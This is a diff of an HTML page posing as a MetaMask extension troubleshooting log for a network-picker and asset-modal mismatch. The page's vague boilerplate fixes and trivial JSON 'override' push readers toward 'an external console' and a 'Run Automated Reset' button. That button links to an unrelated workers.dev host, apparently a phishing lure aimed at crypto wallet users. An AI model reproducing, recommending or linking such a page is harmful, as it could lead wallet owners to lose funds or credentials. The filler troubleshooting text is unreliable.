@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #1a1a24;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,33 +42,34 @@
 <h1>Metamask Extension Bug Assets Miss Match Between Network Picker</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a mismatch between the network selected in the Metamask extension's network picker and the assets displayed in the modal, which shows "All popular" assets instead of the expected assets for the chosen network.</li>
+<li>The Metamask extension displays a mismatch between the selected network in the network picker and the assets shown in the modal, which is supposed to show "All popular" assets but instead shows assets from a different network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension that causes the network picker and the asset modal to become desynchronized, resulting in the incorrect display of assets.</li>
+<li>The error occurs due to a bug in the Metamask extension that causes the network picker and the asset modal to become desynchronized, resulting in the display of incorrect assets.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Clear the Metamask extension's cache and restart the browser</li>
+<li>To resolve the issue, try the following manual overrides:</li>
 <li>Update the Metamask extension to the latest version</li>
-<li>Use the following JSON configuration to manually set the network and asset settings:</li>
+<li>Reset the Metamask extension settings to default</li>
+<li>Use the following JSON configuration to manually override the network settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
 <span class="w">  </span><span class="nt">&quot;assets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;DAI&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USDC&quot;</span><span class="p">]</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Latest version of the browser</li>
-<li>Basic understanding of blockchain and cryptocurrency concepts</li>
+<li>Metamask extension installed and enabled</li>
+<li>Ethereum network selected in the network picker</li>
+<li>Assets modal open and displaying incorrect assets</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
